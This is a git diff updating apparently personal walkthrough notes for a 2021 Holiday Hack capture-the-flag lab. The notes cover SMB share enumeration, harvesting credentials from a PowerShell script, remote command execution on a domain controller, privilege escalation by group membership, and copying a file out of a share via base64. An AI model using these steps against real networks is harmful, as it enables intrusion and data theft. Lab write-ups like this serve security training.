@@ -41,6 +41,16 @@ echo "Snow2021!"
 ```
 
 ### Data Exfil for Secrets
+`nmblookup -A 10.128.3.30`
+`smbclient -L \\SHARE30 -I 10.128.3.30 -N`
+`smbclient -U elfu_svc -L \\SHARE30 -I 10.128.3.30`
+get GetProcessInfo.ps1
+Find creds for RCE method inside GetProcessInfo.ps1
+`pwsh -File GetProcessInfo.ps1` or `pwsh -Command ./GetProcessInfo.ps1`
+
+
+### RCE on the DC
+Modify the RCE command for a session instead
 info: https://github.com/chrisjd20/hhc21_powershell_snippets
 ```
 cat GetProcessInfo.ps1
@@ -50,18 +60,23 @@ $aCred = New-Object System.Management.Automation.PSCredential -ArgumentList ("el
 Invoke-Command -ComputerName 10.128.1.53 -ScriptBlock { Get-Process } -Credential $aCred -Authentication Negotiate
 ```
 
+### Privilege Escalation
+Info: https://github.com/chrisjd20/hhc21_powershell_snippets
+Tip: $ldapConnString = "LDAP://CN=Research Department,CN=Users,DC=elfu,DC=local"
+The first large chunk script uses the remote_elf permissions
+The second large chunk script uses the SSH user permissions
 
-
-`nmblookup -A 10.128.3.30`
-`smbclient -L \\SHARE30 -I 10.128.3.30 -N`
-`smbclient -U elfu_svc -L \\SHARE30 -I 10.128.3.30`
-
-nmap 10.128.3.30 -sV -sC > dc.txt
+Verify SSH username membership in the group:
+```
+pwsh
+> net group "ResearchDepartment" /domain`
+```
 
 ### THE LOOT!
+After you've added the ResearchDepartment group to your SSH user, connect to their share and retreive the loot!
 smbclient -U knuefahyyw \\\\SHARE30\\research_dep -I 10.128.3.30
 get SantaSecretToAWonderfulHolidaySeason.pdf
 openssl base64 -in SantaSecretToAWonderfulHolidaySeason.pdf -out LOOT.pdf
 cat LOOT.pdf | tr -d '\n'
-copy paste t
+copy paste to host machine to view the PDF (save to loot.pdf)
 cat loot.pdf | base64 -d > final.pdf
